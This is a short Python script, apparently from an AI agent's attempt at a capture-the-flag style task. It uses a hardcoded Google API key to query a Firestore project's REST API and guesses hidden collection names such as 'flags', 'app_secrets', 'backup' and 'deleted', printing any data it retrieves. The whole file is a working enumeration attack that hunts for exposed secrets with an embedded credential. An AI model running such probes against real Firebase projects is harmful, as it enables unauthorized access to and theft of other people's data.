import urllib.request
import json

project_id = "business-pro-d657d"
api_key = "AIzaSyDH1sF1FEasvvisSp-B8m2ETk2N5L4rZq8"

def list_documents(collection):
    url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection}?key={api_key}"
    try:
        with urllib.request.urlopen(url) as response:
            return json.loads(response.read().decode())
    except:
        return None

# Attempting to find hidden collections by checking document IDs that might exist
# Since I can't list collections, I have to guess.
# I already guessed many. Let's try some more.
potential = ["flags", "system_flags", "app_secrets", "internal_data", "backup", "trash", "deleted"]
for p in potential:
    res = list_documents(p)
    if res and "documents" in res:
        print(f"FOUND {p}")
        print(json.dumps(res, indent=2))
